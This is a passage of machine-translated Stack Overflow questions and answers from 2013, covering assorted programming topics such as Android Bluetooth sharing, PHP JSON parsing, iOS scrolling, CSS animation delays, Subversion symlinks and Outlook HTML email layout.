for %%i in ("%UserInput%") do set path="%%~dpi"
cd %path% 
```

# android - 为什么使用蓝牙 OBEX 对象推送配置文件 (OPP) 发送文件是设备特定的

> ID：15772854
> 
> 赞同：0
> 
> 时间：2013-04-02T19:37:51.300
> 
> 标签：android

为什么此代码是特定于设备的？

```
ContentValues values = new ContentValues();
values.put(BluetoothShare.URI, Uri.fromFile(new File(uri.getPath())).toString());

//values.put(BluetoothShare.URI, uri.toString());
values.put(BluetoothShare.MIMETYPE, "image/jpeg");
values.put(BluetoothShare.DESTINATION,device.getAddress());
values.put(BluetoothShare.DIRECTION,BluetoothShare.DIRECTION_OUTBOUND);

Long ts = System.currentTimeMillis();
values.put(BluetoothShare.TIMESTAMP, ts);
final Uri contentUri =  getApplicationContext().getContentResolver().
                               insert(BluetoothShare.CONTENT_URI, values); 
```

# php - 使用 PHP 从 JSON 中提取特定值

> ID：15772858
> 
> 赞同：0
> 
> 时间：2013-04-02T19:38:13.267
> 
> 标签：php, json

我试图从以下 JSON 中提取价格，但似乎无法弄清楚如何引用实际值：

```
{"cards": [ { "high": "0.73", "volume": 1, "percent_change": "-2.67", "name": "Lightning Bolt", "url": "http://blacklotusproject.com/cards/Revised+Edition/Lightning+Bolt/", "price": "0.73", "set_code": "3ED", "average": "0.73", "change": "-0.02", "low": "0.73"}], "currency": "USD" } 
```

到目前为止，我已经得到了这个代码，它进入了卡片数组，但我不确定如何走得更远——我尝试过的每一次尝试都返回 null。

```
$json = file_get_contents($url); $data = json_decode($json, TRUE);
echo var_dump($data[cards]); 
```

有人可以阐明我需要做什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:41:25.643

`$data['cards']`里面有另一个数组。您将需要使用 index 访问此数组`0`。比如，`$data['cards'][0]['high']`等等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:41:39.597

`$data['cards']`本身就是一个数组，所以你可以这样做：

```
foreach ($data['cards'] AS $carditem) {
    echo $carditem['high'];
    ...
} 
```

获取该数组中的所有项目，或者如果您只想要第一项`$data['cards'][0]['...']`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T19:45:10.580

要使用字符串文字数组索引进行访问，请始终使用引号。

```
$data["cards"] 
```

链接：[数组的 PHP 文档](http://php.net/manual/en/language.types.array.php)

# ios - 判断 UITableView 是否滚动到顶部

> ID：15772859
> 
> 赞同：29
> 
> 时间：2013-04-02T19:38:13.950
> 
> 标签：ios, objective-c, xcode, cocoa-touch

我试过这个：

```
- (void)scrollViewDidScrollToTop:(UIScrollView *)scrollView 
```

但是当我将表格视图滚动到顶部时它没有触发。

```
- (void)scrollViewDidScroll:(UIScrollView *)scrollView 
```

确实开火了，所以代表不是问题。

在 viewDidLoad 我也设置了`[myTbl setDoesScrollToTop:YES];`

* * *

## 回答 #1

> 赞同：72
> 
> 时间：2013-04-02T19:42:00.270

`scrollViewDidScrollToTop:`当用户单击状态栏并且`scrollsToTop`属性设置为时，该方法会触发`YES`。从文档：

> 滚动视图在完成滚动到内容顶部时发送此消息。如果内容的顶部已经显示，它可能会立即调用它。要使滚动到顶部手势（点击状态栏）生效，UIScrollView 的 scrollsToTop 属性必须设置为 YES。

如果用户手动滚动到顶部，它不会触发。如果您想处理这种情况，您将必须实现该`scrollViewDidScroll:`方法并自己检查滚动是否在顶部。

您可以通过[contentOffset](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIScrollView_Class/Reference/UIScrollView.html#//apple_ref/occ/instp/UIScrollView/contentOffset)属性检查这一点，例如：

```
if (scrollView.contentOffset.y == 0) { // TOP } 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2020-01-22T10:51:38.510

当表格视图位于导航栏下方并启用安全区域布局指南时，可以进行以下检查：

```
if (tableView.contentOffset.y + tableView.safeAreaInsets.top) == 0 { ... } 
```

奖励：如果您想避免在加载内容之前获得 0，请检查 contentSize：

```
if tableView.contentSize.height > 0 && 
    ((tableView.contentOffset.y + tableView.safeAreaInsets.top) == 0) { ... } 
```

# javascript - 展开所选元素 Javascript 或 Jquery

> ID：15772870
> 
> 赞同：13
> 
> 时间：2013-04-02T19:38:52.223
> 
> 标签：javascript, jquery

这是我的html。

```
<span id="current" class="green unselctable" data-original-title="" title="">
    Lorem Ipsum is simply dummy
</span> 
```

我选择 with`$("#current")`但如果我使用 jQuery unwrap 函数，父标签将被删除。

有没有办法在不解析字符串并将其附加到 dom 的情况下删除 JavaScript 或 jQuery 中的跨度？

**编辑** 我想保留 div 的内容。我只想删除标签。

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2013-04-02T19:42:41.340

您可以将[contents()](http://api.jquery.com/contents/)链接到[unwrap()](http://api.jquery.com/unwrap/)：

```
$("#current").contents().unwrap(); 
```

`contents()`将返回 的所有子`#current`节点，包括文本节点，并且`unwrap()`可以应用于文本节点。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-02T19:42:51.290

```
var $current = $('#current');
$current.replaceWith($current.text()); 
```

[摆弄](http://jsfiddle.net/vfsnX/)当前的两个答案-双关语？

[展开与替换](http://jsperf.com/unwrap-vs-replacewith)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-05-31T19:27:21.260

刚刚问了同样的问题。我认为这可能会稍微好一点......效果相同，但我认为 jQuery 必须做更少的魔法来完成这项工作。

```
$("#current").replaceWith($("#current").contents()); 
```

# desire2learn - ISF 远程插件

> ID：15772874
> 
> 赞同：0
> 
> 时间：2013-04-02T19:39:06.687
> 
> 标签：desire2learn

我想在 D2L LMS 中扩展“插入东西框架”。我知道有 [“远程插件”](http://docs.valence.desire2learn.com/basic/uiplugins.html#remote-plugins)的概念，并且有[“小部件”的示例](http://devs.valence.desire2learn.com/2013/02/15/remote-plugins-the-bookwidget-sample-2/)。我也可以为 ISF 使用远程插件吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:43:46.847

截至 2013 年 4 月，远程插件（尚不）可用于 ISF 系统，但可用于 Course Builder。如果您可以将您的工作流程融入到课程构建器中，那将是*当今*的最佳选择。ISF 显然是通过远程插件提供的下一个热门领域。如果项目没有立即启动，请再次检查，因为将会出现更多远程插件点。

# google-analytics - 谷歌分析 - googlebot 无法访问网站

> ID：15772877
> 
> 赞同：0
> 
> 时间：2013-04-02T19:39:17.240
> 
> 标签：google-analytics, googlebot

抱歉，如果这是不正确的区域。

我使用 Yootheme 和 Rockettheme 开发网站。他们在后端有一个编码区域，您只需在其中输入来自 Analytics 的代码。

但是最近我收到了说明以下内容的电子邮件；

**留言摘要**

网站站长工具向您发送了以下有关您帐户中网站的重要消息。为了使您的网站保持健康，我们建议您定期查看这些消息并解决任何关键问题。

[http://www.anigmabeauty.co.nz/](http://www.anigmabeauty.co.nz/)：Googlebot 无法访问您的网站

在过去 24 小时内，Googlebot 在尝试连接到您的网站时遇到了 1 个错误。您站点的整体连接失败率为 50.0%。

您可以在网站管理员工具中查看有关这些错误的更多详细信息。

* * *

我已经删除了它们并重新添加了网站，工作了一段时间然后做同样的事情。有想法该怎么解决这个吗。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T14:00:40.353

当我打开[http://www.anigmabeauty.co.nz/](http://www.anigmabeauty.co.nz/)我得到**303 查看其他**重定向。这可能会导致问题，因为[303 重定向对 SEO 不太好](http://sharkseo.com/nohat/303-redirects-seo/)。

尝试用 302 重定向替换 303 重定向。

# java - java显示隐藏框架

> ID：15772879
> 
> 赞同：-1
> 
> 时间：2013-04-02T19:39:25.873
> 
> 标签：java, linux, swing, jframe

我有一个应该只是弹出的Java应用程序..让我做点什么然后消失。我有一个不错的小 JFrame GUI 为我工作。

问题是把它带回来。我想使用“全局快捷方式”将其恢复。我在带有标准 jdk 的 Ubuntu 12.04 上。

我有一个分配给 sh 文件的快捷键： cd /path/to/app && java Driver

当然，这每次都会启动应用程序。有没有办法可以将信号发送到正在运行的应用程序（信号以 .sh 文件的形式，我可以为其分配快捷方式）到 frame.setVisible(true) 上？你知道，为了避免每次都重新启动应用程序吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:53:15.833

```
I'm on Ubuntu 12.04 with standard jdk. 
```

*   不是 ***nix 用户，标准方法是使用[带有 JPopupMenu 的 SystemTray](http://docs.oracle.com/javase/tutorial/uiswing/misc/systemtray.html)

*   默认情况下在 API中实现[JFrame.setDefaultCloseOperation(HIDE_ON_CLOSE)](http://docs.oracle.com/javase/7/docs/api/javax/swing/JFrame.html#setDefaultCloseOperation%28int%29)

*   只能调用[`JFrame.setVisible(true)`from`JMenuItem`添加到`JPopup`](https://stackoverflow.com/a/12668999/714968)

*   或从[MouseEvent 添加到 TrayIcon](https://stackoverflow.com/questions/13989265/task-tray-notification-balloon-eventsjava/13989457#13989457)

# php - php 脚本不起作用。但如果我将它包含在其他文件中，它可以工作吗？

> ID：15772881
> 
> 赞同：0
> 
> 时间：2013-04-02T19:39:32.223
> 
> 标签：php

我有这个写了一半的脚本，它根本不起作用

```
<?php

function hit_count() {
        echo $ip_address = $_SERVER['REMOTE_ADDR'];
        $ip_file = file('ip.txt');
        foreach ($ip_file as $ip) {
            $ip_single = trim($ip);
            if ($ip_address==$ip_single) {
                $found = false;
            } else {
                $found = true;
            }
        }

        if ($found==false) {
        echo 'IP not found.';
        }
}
?> 
```

即使第一行也不会显示任何内容。但是你瞧，如果我把它包含在这个文件中

```
<?php
include 'unique-counter.php';

hit_count();
?> 
```

“回声”显示我的IP。

这是怎么发生的？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-02T19:40:07.320

您的脚本本身只定义了一个函数，它不会调用它。

添加`hit_count();`到独立脚本。

# c - 将 MIPS 程序集转换为 C 语句

> ID：15772883
> 
> 赞同：0
> 
> 时间：2013-04-02T19:39:33.830
> 
> 标签：c, assembly, mips, statements

```
addi $s7, $s7, -4
add  $s7, $s7, $s1
lw   $s0, 4($s7) 
```

假设整数变量 i 和 j 在寄存器 $s0 和 $s1 中。假设整数数组 X 的基地址在寄存器 $s7 中。

到目前为止，我有这个：

```
X = X - 4
X = X + j
i = X - 4 + j 
```

这个对吗？我不太确定，所以只是在寻找确认。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-02T19:45:56.967

这是不正确的。请注意，`lw`指令从内存中读取一个字。

在 C 中，它看起来像

```
 //int *x;
  x--;            // addi $s7, $s7, -4 decrements pointer to x one element
  x = (int*)((char*)x + j);  // add $s7, $s7, $s1 increments the address pointed by x j elements
  i = *(x+1);     // lw $s0, 4($s7) reads the next element pointed by x 
```

OP评论后的附录：

如果`j = $s7`是 4 的倍数（注意每个整数占用 4 个字节），那么它可以在 C 中重写为`i = x[j/4]`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T20:10:15.400

lw-->加载字

语法：lw $t, offset($s) 操作：$t = MEM[$s + offset]; Advance_pc (4);

# xcode - 在以编程方式构建 ViewController 的视图时让编译器了解 NSView 子类方法

> ID：15772886
> 
> 赞同：0
> 
> 时间：2013-04-02T19:39:42.597
> 
> 标签：xcode, macos, cocoa, subclass, nsview

我创建了一个 NSView 的子类，它允许我通过 方法轻松更改背景颜色`- (void)setBackgroundColor:(NSColor *)aBackgroundColor`。

我希望我的视图控制器的主视图是这个子类，所以我用`self.view = [[BetterNSView alloc] initWithFrame...`.

在下一行，我尝试设置它的背景颜色：`[self.view setBackgroundColor:[NSColor greenColor]]`. 但是编译器抱怨说 NSView 没有方法`setBackgroundColor`。

为了解决这个问题，我需要使用 typecasting: `[(BetterNSView *)self.view setBackgroundColor:[NSColor greenColor]];`。这样可行。但我不想需要类型转换。

如何告诉编译器`view`视图控制器的属性是`BetterNSView`子类？请记住，我没有使用 IB。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:51:31.100

你有两个合理的选择。

1.  在您的视图控制器上使用正确的类型创建一个访问器，该访问器只是传递到该`view`属性。
2.  处理类型转换。

确实，这是可以进行类型转换的情况之一。

# ruby-on-rails - UTF-8 转换不适用于 String#encode 但 Iconv

> ID：15772887
> 
> 赞同：3
> 
> 时间：2013-04-02T19:39:50.840
> 
> 标签：ruby-on-rails, ruby

我和Iconv有这个：

```
git_log = Iconv.conv 'UTF-8', 'iso8859-1', git_log 
```

现在我想将它更改为使用 String#encode 由于弃用警告，但我不能，不起作用：

```
git_log = git_log.encode(Encoding::UTF_8, :invalid => :replace, :undef => :replace, :replace => '') 
```

我曾经在这里使用 Iconv，它仍然有效：

[https://github.com/gamersmafia/gamersmafia/blob/master/lib/formatting.rb#L244](https://github.com/gamersmafia/gamersmafia/blob/master/lib/formatting.rb#L244)

但是当我用 String#encode 方法替换这些行时，首先 gsub 会引发**“UTF-8 中的无效字节序列”**错误。

你知道为什么吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-02T21:08:28.253

在您打电话给`String#encode`您时，请不要指定源编码。Ruby 使用字符串当前编码作为源，它似乎是 UTF-8，并且根据[文档](http://ruby-doc.org/core-2.0/String.html#method-i-encode)：

> 请注意，从编码转换`enc`为相同编码`enc`是无操作的，即返回接收器时不做任何更改，并且不会引发异常，即使存在无效字节也是如此。

换句话说，调用没有任何效果，并且将字符串中的字节保持原样，编码为 ISO-8859-1。下一次调用`gsub`then 尝试将这些字节解释为 UTF-8，并且由于它们是无效的（它们与 ISO-8859-1 保持不变），您会看到您看到的错误。

`String#encode`有一个接受源编码作为第二个参数的形式，因此您可以明确指定它，类似于您对 Iconv 所做的事情。试试这个：

```
git_log = git_log.encode(Encoding::UTF_8,
                         Encoding::ISO_8859_1,
                         :invalid => :replace,
                         :undef => :replace,
                         :replace => '') 
```

在这种情况下，您也可以使用该`!`表单，它具有相同的效果：

```
git_log.encode!(Encoding::UTF_8,
                Encoding::ISO_8859_1,
                :invalid => :replace,
                :undef => :replace,
                :replace => '') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-29T16:35:00.717

尝试以下方法，如果字符编码错误，则从字符串中删除该字符：

```
invalid_character_indices = []
mystring.each_char.with_index do |char, i|
  invalid_character_indices << i unless char == char.encode(Encoding::UTF_8, Encoding::ISO_8859_1,:invalid => :replace, :undef => :replace, :replace => "")
end
invalid_character_indices.each do |i|
  mystring.delete!(mystring[i])
end 
```

# android - IOS 中的动画延迟无法正常工作

> ID：15772889
> 
> 赞同：1
> 
> 时间：2013-04-02T19:39:56.207
> 
> 标签：android, ios, css, uiwebview

所以我知道 JS setInterval 在 ios 和 android 中有问题。我最近发现 css 中的动画延迟也有问题。我有一个加载微调器，它有 8 个会增长/收缩的点，并且微调器会旋转。所以在开始时，顶部的点让动画增长，然后下一个点有一个延迟，然后动画也被应用。这使它看起来像是在追逐一圈红点。

这是所需外观的小提琴。[http://jsfiddle.net/3xjRF/](http://jsfiddle.net/3xjRF/)

然而，在 iOS 和 Android 上，延迟是奇怪的。有时前 5 个点会同时开始动画或其他。关键是延迟要么不被尊重，要么被舍入，要么被应用在不同的时间。

任何想法如何让 css 动画延迟在 iOS webview 中正常工作？我尝试使用 scale3d 以便它可以在 GPU 中运行，但即便如此，延迟仍然是主要问题。我想用 css vs gif 或其他什么来做。

```
#circularG {
  width: 90px;
  height: 90px;
  position: relative;
  margin:0 auto;
  top: 39%;
  z-index: 10000;
}
.circularG {
  position: absolute;
  background-color: #d4242c;
  width: 20px;
  height: 20px;
  -webkit-border-radius: 14px;
  -moz-border-radius: 14px;
  -webkit-animation-name: bounce_circularG;
  -webkit-animation-duration: 1.28s;
  -webkit-animation-iteration-count: infinite;
  -webkit-animation-direction: linear;
  -moz-animation-name: bounce_circularG;
  -moz-animation-duration: 1.28s;
  -moz-animation-iteration-count: infinite;
  -moz-animation-direction: linear;
  border-radius: 14px;
  -o-animation-name: bounce_circularG;
  -o-animation-duration: 1.28s;
  -o-animation-iteration-count: infinite;
  -o-animation-direction: linear;
  -ms-animation-name: bounce_circularG;
  -ms-animation-duration: 1.28s;
  -ms-animation-iteration-count: infinite;
  -ms-animation-direction: linear;
}

#circularG_1 {
  left: 0;
  top: 35px;
  -webkit-animation-delay: 0.4800000000000001s;
  -moz-animation-delay: 0.4800000000000001s;
  -o-animation-delay: 0.4800000000000001s;
  -ms-animation-delay: 0.4800000000000001s;
}

#circularG_2 {
  left: 10px;
  top: 10px;
  -webkit-animation-delay: 0.64s;
  -moz-animation-delay: 0.64s;
  -o-animation-delay: 0.64s;
  -ms-animation-delay: 0.64s;
}

#circularG_3 {
  top: 0;
  left: 35px;
  -webkit-animation-delay: 0.8s;
  -moz-animation-delay: 0.8s;
  -o-animation-delay: 0.8s;
  -ms-animation-delay: 0.8s;
}

#circularG_4 {
  right: 10px;
  top: 10px;
  -webkit-animation-delay: 0.9600000000000002s;
  -moz-animation-delay: 0.9600000000000002s;
  -o-animation-delay: 0.9600000000000002s;
  -ms-animation-delay: 0.9600000000000002s;
}

#circularG_5 {
  right: 0;
  top: 35px;
  -webkit-animation-delay: 1.12s;
  -moz-animation-delay: 1.12s;
  -o-animation-delay: 1.12s;
  -ms-animation-delay: 1.12s;
}

#circularG_6 {
  right: 10px;
  bottom: 10px;
  -webkit-animation-delay: 1.28s;
  -moz-animation-delay: 1.28s;
  -o-animation-delay: 1.28s;
   -ms-animation-delay: 1.28s;
}

#circularG_7 {
  left: 35px;
  bottom: 0;
  -webkit-animation-delay: 1.44s;
  -moz-animation-delay: 1.44s;
  -o-animation-delay: 1.44s;
  -ms-animation-delay: 1.44s;
}

#circularG_8 {
  left: 10px;
  bottom: 10px;
  -webkit-animation-delay: 1.6s;
  -moz-animation-delay: 1.6s;
  -o-animation-delay: 1.6s;
  -ms-animation-delay: 1.6s;
}

@-webkit-keyframes bounce_circularG {
  0% {
-webkit-transform:scale(1)
  }
  100% {
    -webkit-transform:scale(.3)
  }
}

@-moz-keyframes bounce_circularG {
  0% {
    -moz-transform:scale(1)
  }
  100% {
    -moz-transform:scale(.3)
  }
}

@-o-keyframes bounce_circularG {
  0% {
    -o-transform:scale(1)
  }
  100% {
    -o-transform:scale(.3)
  }
}

@-ms-keyframes bounce_circularG {
  0%{
    -ms-transform:scale(1)
  }
  100% {
    -ms-transform:scale(.3)
  }
} 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T20:04:38.363

奇怪的是，我第一次在 Chrome 中查看它时，它们都同时跳动。但是当我重新打开窗户时，他们终于错开了一个圆圈。

我的想法（这是出路）可能与正在解析的 DOM 以及正在解析和应用的 CSS 有关，并且与动画延迟有关。也许您可以等到 DOM 准备好，然后应用一个父类，然后在该点应用动画？这是一个奇怪的想法，我不知道它是否会起作用。

你在 iOS 和 Android 上做过其他关于动画延迟的测试吗？（我正在做一些小事情，没有注意到任何问题，但我使用的是整数延迟值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-15T18:45:58.687

看起来问题与css应用于dom的时间有关。为了解决这个问题，我没有为每个元素使用具有不同延迟的相同动画，而是为每个使用关键帧偏移的元素使用了关键帧动画。这允许 dom 应用动画而不必担心延迟。这需要更多的 css，但在 ios 中有效。这有点难看，记住你必须为所有浏览器加上前缀，所以你需要一个 -wekbit 等等。您可以看到每个点如何具有不同的偏移量，最后几个点具有起始偏移量，因此它可以进行完整旋转

```
@-ms-keyframes bounce_circularG1 {
  0% {
    -ms-transform:scale(1)
  }
  40%, 100% {
    -ms-transform:scale(.3)
  }
}
@-ms-keyframes bounce_circularG2 {
  13.5% {
    -ms-transform:scale(1)
  }
  0%, 12.5%, 43.5%, 100% {
    -ms-transform:scale(.3)
  }
}
@-ms-keyframes bounce_circularG3 {
  26% {
    -ms-transform:scale(1)
  }
  0%,25%, 46%, 100% {
    -ms-transform:scale(.3)
  }
}
-ms-keyframes bounce_circularG4 {
  38.5% {
    -ms-transform:scale(1)
  }
  0%, 37.5%, 78.5%,100% {
    -ms-transform:scale(.3)
  }
}
@-ms-keyframes bounce_circularG5 {
  51% {
    -ms-transform:scale(1)
  }
  0%, 50%, 91%,100% {
    -ms-transform:scale(.3)
  }
}
@-ms-keyframes bounce_circularG6 {
  63.5% {
    -ms-transform:scale(1)
 }
  3.5%, 62.5% {
    -ms-transform:scale(.3)
  }
  0%, 100% {
    -ms-transform:scale(.37)
  }
}
@-ms-keyframes bounce_circularG7 {
  76% {
    -ms-transform:scale(1)
  }
  16%, 75%{
    -ms-transform:scale(.3)
  }
  0%, 100% {
    -ms-transform:scale(.58)
  }
}
@-ms-keyframes bounce_circularG8 {
  88.5% {
    -ms-transform:scale(1)
  }
  29.5%, 87.5% {
    -ms-transform:scale(.3)
  }
  0%, 100% {
    -ms-transform:scale(.80)
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-22T23:42:34.767

动画延迟在其他 iOS 性能要求方面处于次要地位。正如 Paul Irish 在[这个话题](https://github.com/benschwarz/gallery-css/issues/7)上所说，“对于移动 safari 团队来说，滚动性能胜过规范一致性”。

一个受欢迎的解决方案似乎是将延迟合并到`@keyframe`每条线路的单独规则中，如此处所建议[的](https://github.com/fgnass/spin.js/issues/12)（以及几个替代解决方法）。

# android - 如何更改 Imagebutton 的位置？

> ID：15772890
> 
> 赞同：1
> 
> 时间：2013-04-02T19:39:59.003
> 
> 标签：android, imagebutton

我想`ImageButton`在单击时更改位置`ImageButton`。我使用该代码，但它不起作用。代码 ：

```
imb.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View arg0) {
            // TODO Auto-generated method stub

            LayoutParams ibPar = (LayoutParams) imb.getLayoutParams();

            Random randomIntGenerator = new Random();
            int randomLocationX = randomIntGenerator.nextInt(100);
            int randomLocationY = randomIntGenerator.nextInt(400);

            ibPar.x = randomLocationX;
            ibPar.y = randomLocationY;
            imb.setLayoutParams(ibPar);             }
    }); 
```

有一个错误`LayoutParams ibPar = (LayoutParams) imb.getLayoutParams()`。为什么？

谢谢你的回答！

# ruby-on-rails - Rails 的 GMAPS - 如何处理空白地址？

> ID：15772895
> 
> 赞同：0
> 
> 时间：2013-04-02T19:40:07.243
> 
> 标签：ruby-on-rails, gmaps4rails

我正在使用 gem 'gmaps4rails'。只要位置记录有地址信息，它就可以正常工作。如果地址为空，Rails 不会更新记录。如何测试空白并绕过 GMAPS？

这是模型/location.rb：

```
 acts_as_gmappable :check_process => false

 def gmaps4rails_address
   "#{address1}, #{city}, #{state}, #{zipcode}"
 end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:41:54.537

您应该跳过验证并编写自己的代码。[医生在这里](https://github.com/apneadiving/Google-Maps-for-Rails/wiki/Model-Customization)。

```
acts_as_gmappable :validation => false 
```

# svn - Subversion存储库中的符号链接？

> ID：15772898
> 
> 赞同：10
> 
> 时间：2013-04-02T19:40:10.263
> 
> 标签：svn, symlink

我正在用 PHP 和 Java 开发一个小应用程序。它有一些图片，CSS 和 JS，必须在两者中共享。

我不希望这些文件重复，JS 和 CSS 必须相同。所以我希望，当我在一个地方更改它时，更改会在另一个地方复制。

在 Unix 中，我们有符号链接，因此同一个文件/文件夹可以在文件系统中的多个位置“存在”。在 Subversion 中，我们有`svn copy`，但是一旦执行，两个副本就变得独立了。我想把它们放在一起，在一个副本中完成的提交也将应用于“另一个”。

知道怎么做吗？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-04-02T20:53:45.827

您指的是帖子中的[符号链接](http://en.wikipedia.org/wiki/Symbolic_link)，而不是“影子链接”（我已经编辑了帖子）。Subversion 可以版本符号链接，但另一种方法是使用[Externals](http://svnbook.red-bean.com/en/1.7/svn.advanced.externals.html) （因为目前 Windows 上的 Subversion 不支持符号链接） 。

不同之处在于，如果您使用外部 Subversion，您的系统上实际上会有两个文件副本（指向存储库中的同一位置），而符号链接是文件系统上的单个文件。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-02T22:32:50.800

你没有提到项目是如何在 svn 中布局的，或者你的 java 东西是如何构建的。这些将是添加的很好的细节。

您想研究依赖管理 - 而不是符号链接。正如@alroc 指出的那样，subversion 的这个特性在某些平台上是行不通的。

你真的不想 `svn:externals`。它们几乎一直都是一笔糟糕的交易，而且如果外部解决了同一个回购协议中的某些问题，它们总是如此。这已经涵盖了很多，[这里接受的答案](https://stackoverflow.com/questions/338824/are-subversion-externals-an-antipattern)是一个很好的起点。

我建议你有一个 java 应用程序的仓库，一个 php 的仓库，然后可能是一个普通的仓库。

然后，您的构建（java）和部署（php）可以从存储库中解析适当版本的通用 repos 工件（我建议您查看 nexus 或 artifactory）

# sql-server - SQL Server Management Studio 的昂贵查询中的 Execution/Min 是执行次数还是估计值？

> ID：15772899
> 
> 赞同：5
> 
> 时间：2013-04-02T19:40:15.550
> 
> 标签：sql-server, tsql, ssms

我们偶尔会在“昂贵的查询”下的“活动监视器”中看到超过 11,000 个查询。

我看到在代码中一个查询正在循环中执行，我意识到这不是最好的方法（我没有写它，但可能需要修复它）。

我认为循环不会创建 11,000 次迭代，更像是一次 20 次。所以我的问题是，如果代码在 1/550 秒内执行 20 次查询，那会显示为每分钟 11,000 次执行吗？或者活动监视器真的意味着查询真的执行了 11,000 次？

```
DataTable JobsDT = new DataTable();
DataTable oqDT = new DataTable();
DataTable ePickupDT = new DataTable();
DataTable upDT = new DataTable();
JobsDT = Q.SelectRecords("SELECT [Quote]... etc etc etc" + ((Filters.Length > 0) ? Filters : "") + ") ORDER BY " + SortBy + " " + SortDirection);
    oqDT=...;
    ePickupDT=...;
    upDT=...;

//Merge the datatables
DT.Merge(JobsDT);
DT.Merge(oqDT);
DT.Merge(ePickupDT);
DT.Merge(upDT);

//Build cart header
Cart += "<table id='CurrentOrdersDiv' style='font-family: Arial; font-size: small;' width='100%' cellpadding='2' cellspacing='0'>";

//Build cart body
for (int row = 0; row < DT.Rows.Count; row++)
{
    try { Adjustment = (Q.SelectRecords("SELECT [PriceAdjustment] FROM [Media] WHERE [PriceAdjustment] > 0 AND [Quote] = " + Convert.ToInt32(DT.Rows[row]["Quote"])).Rows.Count > 0) ? true : false; } catch { }
    //Create flags
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T20:41:08.270

我不确定这一点，但我不认为 Execution/Min 可以“推断”。因此，在您的示例中，如果在一秒钟内发生了 20 个查询（并且在那一分钟内没有再次发生），我认为 Execution/Min 只会平均为 20。您可以检查 sys.dm_exec_query_stats.execution_count 以查看是否11000 这个数字是有道理的。

也许您的代码每次运行只执行大约 20 个查询，但运行非常频繁？

# html - Outlook HTML 电子邮件 - 图像切片中的垂直间隙

> ID：15772904
> 
> 赞同：1
> 
> 时间：2013-04-02T19:40:23.780
> 
> 标签：html, email, outlook, slice

所以，典型的问题。我在这里搜索了一船。尝试了所有建议。坚果

所以也许要问新鲜的问题。

我的图像切片之间的 Outlook 2013（我认为也是 2007 年）中存在一些严重的差距。（我的文字也比它设置的更远）

知道 display:block 并不真正适用于 Outlook。我试过包装跨度并给跨度一个显示：块

我不知所措。我希望有人可以轻松回答这个问题。咕咕咕！！！！外表！为什么一定要这么受欢迎？

[http://pastebin.com/ESfEmWer](http://pastebin.com/ESfEmWer) [http://tinypic.com/r/2gtdhu1/6](http://tinypic.com/r/2gtdhu1/6)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T21:05:15.143

不要去

```
display: [anything] 
```

如果您希望包含 Outlook 2007。请参阅[http://www.xequte.com/support/maillistking/css_in_emails.html](http://www.xequte.com/support/maillistking/css_in_emails.html)以了解您可以使用哪些 CSS 样式以及最好不要使用哪些 CSS 样式。

不要使用任何空格尾随

```
<td> 
```

并且不要在前面使用任何空格

```
</td> 
```

你也应该避免

```
<style>...</style> 
```

因为这很可能会被完全剥离。总是选择内联样式。而且我知道这不是真正答案的一部分，而只是作为一个提示：如果您正在制作 HTML 时事通讯，请将它们制作成您正在为 Internet Explorer 4 制作它们。像 Outlook 这样的电子邮件客户端使用最荒谬的 CSS-你可以想象的渲染器。甚至 Internet Explorer 5 在呈现 CSS 方面也比现代 Outlook 更复杂。

哦，顺便说一句：如果您的时事通讯的收件人有可能在 hotmail、gmx 或 gmail 中在线阅读它们，那么您也应该检查它们。你会惊叹不已，想知道那些在线客户端如何处理你的代码以及它们注入了什么。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-04T17:32:36.297

你有太多的colspan，这可能会导致问题。你应该嵌套你的表。

我已经创建了数百封电子邮件，并且从未遇到过由电子邮件代码中的换行引起的空白问题。（Outlook 2007 是我检查电子邮件的第一件事）

`display:block;`使用图像并自己保存图像始终是一种很好的做法`<td>`。

尝试这样的事情：

```
<html>
<head>
<title>Ambassador Newsletter</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>img {display:block}</style>
</head>

<!--REPLACE the following text with the path to the images on your server http://emaniocreative.com/eblasts/3_26_2013/ -->

<body style="margin: 0px; padding: 0px; background-color: #FFFFFF;" bgcolor="#FFFFFF"><table bgcolor="#ebebeb" width="100%" border="0" align="center" cellpadding="0" cellspacing="0"><tr><td><table width="600" border="0" align="center" cellpadding="0" cellspacing="0"><tr><td valign="top" style="padding-top:30px; padding-bottom:30px;">
<table id="Table_01" width="650" border="0" cellpadding="0" cellspacing="0" bgcolor="#ffffff" style="border-collapse: collapse;">
    <tr>
        <td>

<!-- NEST A TABLE INSTEAD-->
      <table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#770000">
        <tr>
          <td style="padding:20px;">
            header
          </td>
        </tr>
      </table>
<!-- /NEST-->

    </td>
    </tr>
    <tr>
        <td>

<!-- NEST A TABLE INSTEAD-->
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
        <tr>
          <td style="padding:20px;">
            Body section 1
          </td>
        </tr>
        <tr>
